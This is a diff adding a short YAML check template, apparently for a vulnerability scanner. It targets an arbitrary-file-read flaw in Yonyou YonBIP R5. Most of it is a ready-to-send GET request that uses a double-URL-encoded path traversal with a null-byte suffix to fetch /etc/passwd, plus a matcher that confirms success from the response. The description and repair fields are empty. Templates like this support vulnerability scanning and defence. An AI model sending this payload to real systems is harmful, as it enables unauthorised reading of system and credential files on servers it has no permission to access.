@@ -1,0 +1,20 @@
+id:
+
+info:
+  name: 用友YonBIP R5旗舰版 yonbiplogin 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+response1:
+  body: bin
+  code: 200
+requests2:
+response2:
